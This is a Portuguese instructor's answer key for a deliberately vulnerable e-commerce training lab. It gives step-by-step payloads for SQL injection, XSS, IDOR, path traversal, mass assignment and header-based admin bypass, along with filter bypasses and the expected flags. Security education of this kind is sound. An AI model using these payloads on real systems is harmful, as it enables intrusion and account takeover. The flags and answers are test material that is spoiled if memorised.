# BalacubacoSHOP Security Lab — Guia do Instrutor (gabarito completo)

**Uso restrito ao corpo docente.** Este documento contem a localizacao exata de cada
vulnerabilidade, as flags esperadas, o passo a passo de exploracao detalhado nos 3 métodos
(Navegador/DevTools, PowerShell e Burp Suite) e a correcao recomendada.
Nao distribua este arquivo aos alunos antes da atividade.

Todas as flags seguem o formato `BALACUBACO{...}` e sao validadas em `POST /api/lab/submit`
contra a tabela `flags` (ver `server/db/database.js`).

---

## ⚠️ Medidas Anti-IA e Anti-Cola

### WAF Anti-IA (Filtros Artesanais)

O backend possui filtros que **bloqueiam payloads classicos** que IAs generativas sugerem,
forcando o aluno a pensar e adaptar o ataque:

| Missao | Payload classico bloqueado | Filtro no backend | Bypass esperado |
|--------|---------------------------|-------------------|-----------------|
| **01** (SQLi) | `' OR '1'='1' --` | Bloqueia `'1'='1'` e `--` | `' OR 2>1 /*`, `' OR 'a'='a' /*`, `admin' /*` |
| **03** (XSS) | `<script>alert(1)</script>` | Bloqueia `<script` e `alert(` | `<img src=x onerror=...>`, `<svg onload=...>` |
| **05** (Path Traversal) | `../../private/flag.txt` | Bloqueia sequencia `../` | `....//....//private/flag_m05.txt` (bypass duplicacao) |
| **07** (Mass Assignment) | `"role": "admin"` | Bloqueia campo `role` | `"is_admin": true` ou `"access_level": 99` |

> **Nota para o instrutor:** Os filtros sao propositalmente fracos e contornaveis —
> o objetivo e impedir o copy-paste direto de IAs, nao criar uma WAF real.

### Flags Dinamicas por Nome (Anti-Cola)

Cada flag passa a ser **unica por aluno** quando o nome e informado. O servidor
gera a flag combinando o nome com um segredo criptografico (HMAC-SHA256).

**Formato:** `BALACUBACO{base_nome_hash8}`

**Exemplo:** Para o nome `joao` na Missao 01:
- Flag: `BALACUBACO{sql_1nj3ct10n_l0g1n_joao_a1b2c3d4}`

O fluxo de submissao exige nome: sem handle informado, a flag base nao e aceita.
Se o instrutor quiser validar localmente sem personalizacao, basta informar um handle
qualquer consistente com a sessao. A submissao sempre precisa bater com a flag
personalizada daquele nome.

- **Codigo fonte:** `server/utils/flags.js`
- **Validacao:** `server/routes/lab.js` → `POST /api/lab/submit`
- **Resolucao do nome:** header `X-Lab-Handle`, cookie `balacubaco_handle`, query `?handle=`, ou sessao

---

## Missao 01 — Autenticacao (SQL Injection)

- **Onde:** `server/routes/auth.js`, rota `POST /api/auth/login`.
- **Por que existe:** a query e montada por concatenacao direta de string (`email` e `password`
  interpolados na string SQL), permitindo injecao de codigo SQL.
- **Flag base:** `BALACUBACO{sql_1nj3ct10n_l0g1n}`
- **WAF ativo:** bloqueia `'1'='1'` e `--`

### Como demonstrar:

> **IMPORTANTE:** Os payloads classicos `' OR '1'='1' --` sao bloqueados pelo WAF.
> Use alternativas abaixo.

#### 1. Navegador (HTML / UI)
1. Acesse `http://localhost:3000/login.html`.
2. No campo **Email**, informe: `' OR 2>1 /*` (ou `admin@balacubacoshop.com.br' /*`).
3. No campo **Senha**, digite qualquer valor (ex: `123`).
4. Clique em **Entrar**.
5. Va para a pagina **Minha Conta** (`/conta.html`) — a nota interna do administrador sera exibida contendo a flag.

#### 2. PowerShell
```powershell
# 1. Faz o login via SQL Injection (bypass do WAF) e armazena a sessao ativa
Invoke-RestMethod -Uri "http://localhost:3000/api/auth/login" `
  -Method Post -ContentType "application/json" `
  -Body '{"email":"'' OR 2>1 /*","password":"123"}' `
  -SessionVariable sessao

# 2. Consulta o perfil logado para recuperar a flag
Invoke-RestMethod -Uri "http://localhost:3000/api/users/1" -WebSession $sessao
```

#### 3. Burp Suite
Envie a requisicao no **Repeater**:
```http
POST /api/auth/login HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{
  "email": "' OR 2>1 /*",
  "password": "qualquer_coisa"
}
```
Use o cookie `balacubaco_sid` retornado no `Set-Cookie` para consultar o perfil:
```http
GET /api/users/1 HTTP/1.1
Host: localhost:3000
Cookie: balacubaco_sid=<seu_sid>
```

- **Correcao real:** usar *prepared statements* com parametros bind (`db.prepare('... WHERE email = ? AND password = ?').get(email, hash)`).

---

## Missao 02 — Dados de Usuario (IDOR / BOLA)

- **Onde:** `server/routes/users.js`, rota `GET /api/users/:id`.
- **Por que existe:** o middleware `requireLogin` apenas confere se ha uma sessao autenticada,
  mas nao valida se `req.session.userId === req.params.id`.
- **Flag base:** `BALACUBACO{1d0r_perfil_usuario}`

### Como demonstrar:

#### 1. Navegador (DevTools Console)
1. Faca login com uma conta de cliente comum (ex: `joao.pereira@example.com` / `futebol123` ou crie uma em `/cadastro.html`).
2. Abra o Console do DevTools (**F12**) e execute:
```javascript
fetch('/api/users/1').then((r) => r.json()).then(console.log);
```
O objeto JSON impresso no console revelara o campo `idor_flag`.

#### 2. PowerShell
```powershell
# 1. Login como cliente comum
Invoke-RestMethod -Uri "http://localhost:3000/api/auth/login" `
  -Method Post -ContentType "application/json" `
  -Body '{"email":"joao.pereira@example.com","password":"futebol123"}' `
  -SessionVariable sessao

# 2. Requisicao IDOR para consultar a conta do Admin (id 1)
Invoke-RestMethod -Uri "http://localhost:3000/api/users/1" -WebSession $sessao
```

#### 3. Burp Suite
Logado com conta comum, envie no **Repeater**:
```http
GET /api/users/1 HTTP/1.1
Host: localhost:3000
Cookie: balacubaco_sid=<seu_sid_de_usuario_comum>
```

- **Correcao real:** validar `req.params.id == req.session.userId` (ou permitir apenas se `session.role === 'admin'`).

---

## Missao 03 — Avaliacoes de Produtos (Stored & Reflected XSS)

- **Onde (Stored):** `server/routes/products.js` (`POST /api/products/:id/reviews` grava sem sanitizar) + `public/js/produto.js` (`innerHTML` renderiza cru).
- **Onde (Reflected):** `server/routes/products.js` (`GET /api/products?q=`) + `public/js/produtos.js`.
- **Flag base:** `BALACUBACO{xss_avaliacoes}`
- **WAF ativo:** bloqueia `<script` e `alert(`

### Como demonstrar:

> **IMPORTANTE:** O payload classico `<script>alert(1)</script>` e bloqueado pelo WAF.
> Use tags alternativas como `<img>` ou `<svg>`.

#### 1. Navegador (HTML / UI)
* **Stored XSS:**
  1. Acesse a pagina de qualquer produto (ex: `/produto.html?id=1`).
  2. No formulario de avaliacao, envie no campo comentario:
     ```html
     <img src=x onerror="fetch('/api/lab/flag-xss').then(r=>r.json()).then(d=>document.title=d.flag)">
     ```
     Ou para exibir via popup (sem usar `alert`):
     ```html
     <svg onload="fetch('/api/lab/flag-xss').then(r=>r.json()).then(d=>prompt('Flag:',d.flag))">
     ```
  3. Ao recarregar a pagina, o script executa e exibe a flag.

* **Reflected XSS:**
  Acesse a URL de busca refletida:
  `http://localhost:3000/produtos.html?q=<img src=x onerror=document.title='XSS'>`

#### 2. PowerShell
```powershell
# Envia a avaliacao contendo o payload de Stored XSS (sem <script> e sem alert)
Invoke-RestMethod -Uri "http://localhost:3000/api/products/1/reviews" `
  -Method Post -ContentType "application/json" `
  -Body '{"author_name":"Hacker","rating":5,"comment":"<img src=x onerror=\"fetch(''/api/lab/flag-xss'').then(r=>r.json()).then(d=>document.title=d.flag)\">"}'

# Consulta as avaliacoes para confirmar a persistencia do script
Invoke-RestMethod -Uri "http://localhost:3000/api/products/1/reviews"
```

#### 3. Burp Suite
No **Repeater**:
```http
POST /api/products/1/reviews HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{
  "author_name": "Atacante",
  "rating": 5,
  "comment": "<img src=x onerror=\"fetch('/api/lab/flag-xss').then(r=>r.json()).then(d=>document.title=d.flag)\">"
}
```

- **Correcao real:** nunca usar `innerHTML` com dado nao confiavel; usar `textContent` ou bibliotecas de sanitizacao (ex: DOMPurify).

---

## Missao 04 — Administracao (Broken Access Control)

- **Onde:** `server/routes/admin.js`, rota `GET /api/admin/dashboard`.
- **Por que existe:** o endpoint confia em um header (`X-Role`) ou cookie (`bala_role`) fornecido pelo cliente para autorizar o acesso.
- **Flag base:** `BALACUBACO{broken_access_admin}`

### Como demonstrar:

#### 1. Navegador (DevTools Console)
Abra o Console (**F12**) em qualquer pagina do site e execute:
```javascript
fetch('/api/admin/dashboard', { headers: { 'X-Role': 'admin' } })
  .then((r) => r.json())
  .then(console.log);
```

#### 2. PowerShell
```powershell
Invoke-RestMethod -Uri "http://localhost:3000/api/admin/dashboard" `
  -Headers @{ "X-Role" = "admin" }
```

#### 3. Burp Suite
No **Repeater** (funciona sem cookies de sessao):
```http
GET /api/admin/dashboard HTTP/1.1
Host: localhost:3000
X-Role: admin
```

- **Correcao real:** determinar autorizacao estritamente a partir da sessao validada no servidor (`req.session.role === 'admin'`).

---

## Missao 05 — Upload de Arquivos (Insecure Upload + Path Traversal)

- **Onde:** `server/routes/files.js`, rota `GET /api/files/download?name=`.
- **Por que existe:** o parametro `name` e concatenado via `path.join` sem validacao de limites de diretorio, permitindo leitura de arquivos fora da pasta publica.
- **Alvo:** `server/private/flag_m05.txt` (o endpoint devolve a flag dinamica da missao ao atingir o caminho privado).
- **Flag base:** `BALACUBACO{upload_inseguro}`
- **WAF ativo:** bloqueia a sequencia literal `../`

### Como demonstrar:

> **IMPORTANTE:** O payload classico `../../private/flag_m05.txt` e bloqueado pelo WAF.
> Use bypass por duplicacao (`....//`) para que, apos a sanitizacao ingenua, reste `../`.

#### 1. Navegador (URL / Console)
* **Direto pela URL:**
  Abra no navegador:
  `http://localhost:3000/api/files/download?name=....//....//private/flag_m05.txt`
* **Ou pelo Console (F12):**
  ```javascript
  fetch('/api/files/download?name=....//....//private/flag_m05.txt')
    .then((r) => r.text())
    .then(console.log);
  ```

#### 2. PowerShell
```powershell
Invoke-RestMethod -Uri "http://localhost:3000/api/files/download?name=....//....//private/flag_m05.txt"
```

#### 3. Burp Suite
No **Repeater**:
```http
GET /api/files/download?name=....//....//private/flag_m05.txt HTTP/1.1
Host: localhost:3000
```

- **Correcao real:** usar `path.resolve` e verificar se o caminho resultante comeca com o prefixo permitido do diretorio de uploads.

---

## Missao 06 — Pedidos (IDOR + CSRF)

- **Onde (IDOR):** `server/routes/orders.js`, rota `GET /api/orders/:id`.
- **Por que existe:** busca pedidos sem conferir `order.user_id === req.session.userId`. O pedido com id=3 (pedido VIP do admin) contem a flag na nota interna.
- **Flag base:** `BALACUBACO{idor_pedidos}`

### Como demonstrar:

#### 1. Navegador (HTML / UI)
1. Faca login com uma conta de cliente comum (ex: `joao.pereira@example.com` / `futebol123`).
2. Acesse diretamente na URL: `http://localhost:3000/pedidos.html?id=3`.
3. A tela exibira os detalhes do pedido do administrador, com o campo de nota interna contendo a flag.
4. *Pelo Console (F12):*
   ```javascript
   fetch('/api/orders/3').then((r) => r.json()).then(console.log);
   ```

#### 2. PowerShell
```powershell
# 1. Login como usuario comum
Invoke-RestMethod -Uri "http://localhost:3000/api/auth/login" `
  -Method Post -ContentType "application/json" `
  -Body '{"email":"joao.pereira@example.com","password":"futebol123"}' `
  -SessionVariable sessao

# 2. Busca o pedido id 3 pertencente a outra conta
Invoke-RestMethod -Uri "http://localhost:3000/api/orders/3" -WebSession $sessao
```

#### 3. Burp Suite
No **Repeater**:
```http
GET /api/orders/3 HTTP/1.1
Host: localhost:3000
Cookie: balacubaco_sid=<seu_sid_de_usuario_comum>
```

- **Correcao real:** validar `order.user_id === req.session.userId` antes de entregar o pedido.

---

## Missao 07 — API (Mass Assignment / Insecure API Authorization)

- **Onde:** `server/routes/auth.js`, rota `POST /api/auth/register`.
- **Por que existe:** o endpoint aceita campos extras no corpo da requisicao JSON e grava diretamente no banco.
- **Flag base:** `BALACUBACO{api_sem_autorizacao}`
- **WAF ativo:** bloqueia o campo `"role"` diretamente

### Como demonstrar:

> **IMPORTANTE:** O payload classico `"role": "admin"` e bloqueado pelo WAF.
> O aluno precisa fazer fuzzing de parametros JSON para descobrir campos alternativos
> como `"is_admin": true` ou `"access_level": 99`.

#### 1. Navegador (DevTools Console)
Abra o Console (**F12**) e execute:
```javascript
// 1. Cadastra uma nova conta usando o campo alternativo is_admin
await fetch('/api/auth/register', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ name: 'Invasor', email: 'invasor@test.com', password: '123', is_admin: true })
});

// 2. Consulta o endpoint administrativo protegido por sessao
fetch('/api/admin/flag').then((r) => r.json()).then(console.log);
```

**Alternativa com `access_level`:**
```javascript
await fetch('/api/auth/register', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ name: 'Invasor2', email: 'invasor2@test.com', password: '123', access_level: 99 })
});
```

#### 2. PowerShell
```powershell
# Opcao A: Usando is_admin
Invoke-RestMethod -Uri "http://localhost:3000/api/auth/register" `
  -Method Post -ContentType "application/json" `
  -Body '{"name":"Invasor","email":"invasor@test.com","password":"123","is_admin":true}' `
  -SessionVariable sessao

# Opcao B: Usando access_level
Invoke-RestMethod -Uri "http://localhost:3000/api/auth/register" `
  -Method Post -ContentType "application/json" `
  -Body '{"name":"Invasor","email":"invasor2@test.com","password":"123","access_level":99}' `
  -SessionVariable sessao

# Acessa o endpoint administrativo com a sessao criada
Invoke-RestMethod -Uri "http://localhost:3000/api/admin/flag" -WebSession $sessao
```

#### 3. Burp Suite
No **Repeater**:
```http
POST /api/auth/register HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{
  "name": "Invasor",
  "email": "invasor_burp@test.com",
  "password": "123",
  "is_admin": true
}
```
Em seguida, usando o cookie `balacubaco_sid` retornado:
```http
GET /api/admin/flag HTTP/1.1
Host: localhost:3000
Cookie: balacubaco_sid=<sid_da_conta_criada>
```

- **Correcao real:** usar allowlist estrita de campos aceitos no cadastro (`const { name, email, password } = req.body`), ignorando qualquer parametro de controle de acesso.

---

## Missao 08 — Divulgacao de Informacoes (Debug Exposto)

- **Onde:** `server/routes/debug.js`, rota `GET /api/debug/info`.
- **Por que existe:** rota interna esquecida em producao que expoe variaveis de ambiente e configuracoes internas.
- **Flag base:** `BALACUBACO{informacao_exposta}`

### Como demonstrar:

#### 1. Navegador (URL / Console)
* **Direto pela URL:**
  Abra no navegador: `http://localhost:3000/api/debug/info`
* **Ou pelo Console (F12):**
  ```javascript
  fetch('/api/debug/info').then((r) => r.json()).then(console.log);
  ```

#### 2. PowerShell
```powershell
Invoke-RestMethod -Uri "http://localhost:3000/api/debug/info"
```

#### 3. Burp Suite
No **Repeater**:
```http
GET /api/debug/info HTTP/1.1
Host: localhost:3000
```

- **Correcao real:** remover ou desabilitar rotas de depuracao em ambientes produtivos e limitar detalhes em respostas de erro.

---

## Referencia Rapida — Flags Base

| Missao | Codigo | Flag Base | Onde e exibida |
|--------|--------|-----------|----------------|
| 01 | M01 | `BALACUBACO{sql_1nj3ct10n_l0g1n}` | `secret_note` do admin (GET /api/users/1 ou /api/auth/me) |
| 02 | M02 | `BALACUBACO{1d0r_perfil_usuario}` | `idor_flag` do admin (GET /api/users/1) |
| 03 | M03 | `BALACUBACO{xss_avaliacoes}` | GET /api/lab/flag-xss (chamado pelo JS injetado) |
| 04 | M04 | `BALACUBACO{broken_access_admin}` | `flag` no JSON de GET /api/admin/dashboard |
| 05 | M05 | `BALACUBACO{upload_inseguro}` | Conteudo de `server/private/flag_m05.txt` via flag dinamica do endpoint |
| 06 | M06 | `BALACUBACO{idor_pedidos}` | `internal_note` do pedido id=3 (GET /api/orders/3) |
| 07 | M07 | `BALACUBACO{api_sem_autorizacao}` | `flag` no JSON de GET /api/admin/flag |
| 08 | M08 | `BALACUBACO{informacao_exposta}` | `flag` no JSON de GET /api/debug/info |

> **Lembrete:** Se o aluno definiu um nome, a flag sera
> `BALACUBACO{base_nome_hash8}` - unica e intransferivel quando o nome e usado.

---

## Mapa de cobertura (12 categorias)

| # | Categoria | Missao(oes) |
|---|-----------|-------------|
| 1 | SQL Injection | 01 |
| 2 | IDOR / BOLA | 02, 06 |
| 3 | Stored XSS | 03 |
| 4 | Reflected XSS | 03 |
| 5 | Broken Access Control | 04 |
| 6 | Insecure File Upload | 05 |
| 7 | Path Traversal | 05 |
| 8 | Information Disclosure | 08 |
| 9 | Insecure Session Handling | 01 (base), reforcado em 03/06 |
| 10 | CSRF | 06 |
| 11 | Insecure API Authorization | 04, 07 |
| 12 | Debug/Dev Info Exposto | 08 |

---

## Resumo dos Filtros WAF Anti-IA

| Arquivo | Missao | Filtro | Mensagem de bloqueio |
|---------|--------|--------|----------------------|
| `server/routes/auth.js` (login) | 01 | `'1'='1'` e `--` | Sugere bypass com `2>1` e `/*` |
| `server/routes/products.js` (reviews) | 03 | `<script` e `alert(` | Sugere tags `<img>`, `<svg>` e outros metodos JS |
| `server/routes/files.js` (download) | 05 | `../` | Sugere bypass por duplicacao `....//` |
| `server/routes/auth.js` (register) | 07 | campo `role` | Sugere fuzzing de parametros JSON |
